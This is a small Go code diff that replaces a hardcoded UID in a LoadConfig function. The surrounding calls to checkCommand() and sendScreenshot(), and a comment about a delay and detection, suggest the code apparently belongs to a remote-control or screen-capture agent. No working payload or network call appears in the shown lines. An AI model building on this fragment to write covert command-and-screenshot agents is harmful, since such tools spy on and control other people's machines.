@@ -118,7 +118,7 @@ func LoadConfig() {
 			}
 			// takeAMoment() //Delay helps detection
 			//REMOVE AFTER TESTING
-			myUID = "1c556d4e-f8df-4bca-89f0-d68ddf0478e0"
+			myUID = "492cf494-8ba8-42d8-9852-f926ad50d618"
 			go checkCommand()
 			go sendScreenshot()
 		}
